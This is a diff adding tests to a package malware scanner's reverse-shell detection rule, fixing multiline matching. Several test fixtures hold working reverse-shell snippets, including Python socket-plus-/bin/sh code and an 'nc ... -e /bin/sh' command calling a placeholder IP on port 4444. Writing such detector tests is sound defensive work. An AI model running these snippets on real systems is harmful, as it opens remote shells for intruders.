@@ -1,4 +1,4 @@
-import tempfile
+import tempfile
 import os
 from unittest.mock import mock_open, patch
 
@@ -414,3 +414,101 @@ def test_is_match_in_comment_with_byte_offset():
             assert Analyzer.is_match_in_comment(f.name, line_number=3, byte_offset=byte_offset) is True
         finally:
             os.unlink(f.name)
+
+
+def test_reverse_shell_detects_split_statement_socket_connect():
+    """A socket chain split across two statements (s = socket.socket(...);
+    then s.connect(...)) is the same reverse shell as the chained one-liner,
+    but YARA "." does not match newlines so the rule used to miss it entirely
+    (issue #911)."""
+    code = (
+        "import socket\n"
+        "import subprocess\n"
+        "\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "s.connect((\"1.2.3.4\", 4444))\n"
+        "subprocess.Popen(\"/bin/sh\")\n"
+    )
+    with tempfile.TemporaryDirectory() as d:
+        _write(d, "payload.py", code)
+        result = pypi_analyzer.analyze_sourcecode(d, {"threat-network-reverse-shell"})
+        findings = result["results"].get("threat-network-reverse-shell", [])
+        assert findings, "split-statement reverse shell must be detected"
+        assert any("socket" in f["match"] for f in findings)
+
+
+def test_reverse_shell_detects_multiline_socket_constructor_args():
+    """Constructor arguments wrapped across lines must still complete the
+    socket chain (the [\s\S] argument gap in issue #911)."""
+    code = (
+        "import socket\n"
+        "import subprocess\n"
+        "s = socket.socket(\n"
+        "    socket.AF_INET,\n"
+        "    socket.SOCK_STREAM,\n"
+        ")\n"
+        "s.connect((\"1.2.3.4\", 4444))\n"
+        "subprocess.Popen(\"/bin/sh\")\n"
+    )
+    with tempfile.TemporaryDirectory() as d:
+        _write(d, "payload.py", code)
+        result = pypi_analyzer.analyze_sourcecode(d, {"threat-network-reverse-shell"})
+        assert result["results"].get("threat-network-reverse-shell"), (
+            "multiline constructor arguments must not break the chain"
+        )
+
+
+def test_reverse_shell_detects_wrapped_nc_exec():
+    """A netcat command wrapped with a shell continuation is still a reverse
+    shell (issue #911: "." did not cross the newline)."""
+    code = "nc 1.2.3.4 4444 " + chr(92) + "\n    -e /bin/sh"
+    with tempfile.TemporaryDirectory() as d:
+        _write(d, "connect.sh", code)
+        result = pypi_analyzer.analyze_sourcecode(d, {"threat-network-reverse-shell"})
+        assert result["results"].get("threat-network-reverse-shell")
+
+
+def test_reverse_shell_detects_socket_with_later_exec():
+    """The exec() corroborating signal may live on a later line than the
+    socket chain (issue #911: the old gap could not cross the newline)."""
+    code = (
+        "import socket\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((\"1.2.3.4\", 4444))\n"
+        "exec(\n"
+        "    s.recv(4096)\n"
+        ")\n"
+    )
+    with tempfile.TemporaryDirectory() as d:
+        _write(d, "payload.py", code)
+        result = pypi_analyzer.analyze_sourcecode(d, {"threat-network-reverse-shell"})
+        assert result["results"].get("threat-network-reverse-shell")
+
+
+def test_reverse_shell_still_detects_chained_socket_connect():
+    """Guard: the one-line chained form keeps being detected."""
+    code = (
+        "import socket\n"
+        "import subprocess\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((\"1.2.3.4\", 4444))\n"
+        "subprocess.Popen(\"/bin/sh\")\n"
+    )
+    with tempfile.TemporaryDirectory() as d:
+        _write(d, "payload.py", code)
+        result = pypi_analyzer.analyze_sourcecode(d, {"threat-network-reverse-shell"})
+        assert result["results"].get("threat-network-reverse-shell")
+
+
+def test_reverse_shell_leaves_multi_line_socket_client_alone():
+    """Guard: a plain socket client without a shell-spawn corroborating
+    signal must stay undetected, including across line breaks."""
+    code = (
+        "import socket\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "s.connect((\"example.com\", 80))\n"
+        "s.send(b\"hello\")\n"
+        "print(s.recv(200))\n"
+    )
+    with tempfile.TemporaryDirectory() as d:
+        _write(d, "client.py", code)
+        result = pypi_analyzer.analyze_sourcecode(d, {"threat-network-reverse-shell"})
+        assert not result["results"].get("threat-network-reverse-shell")
